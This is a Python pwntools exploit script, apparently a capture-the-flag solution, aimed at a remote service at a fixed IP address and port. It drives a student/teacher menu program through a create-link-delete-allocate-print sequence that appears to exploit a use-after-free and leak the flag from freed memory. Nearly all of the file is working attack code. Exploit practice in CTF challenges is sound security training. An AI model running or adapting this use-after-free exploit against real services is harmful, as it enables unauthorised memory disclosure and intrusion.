#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 51.250.112.223 --port 1737
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = "./main"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '51.250.112.223'
port = int(args.PORT or 1737)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.recv()
# Create student
io.sendline(b"5")

io.recv()
# Student name
io.sendline(b"a")

io.recv()
# Create teacher
io.sendline(b"6")

io.recv()
# Teacher name
io.sendline(b"a")

io.recv()
# Link student to teacher
io.sendline(b"7")

io.recv()
# Student index
io.sendline(b"1")

io.recv()
# Teacher index
io.sendline(b"1")

io.recv()
# Delete student
io.sendline(b"8")

io.recv()
# Student index
io.sendline(b"1")

io.recv()
# Allocate flag
io.sendline(b"10")

io.recv()
# Print teacher
io.sendline(b"2")

io.recv()
# Teacher index
io.sendline(b"1")

print(io.recv().decode())
io.close()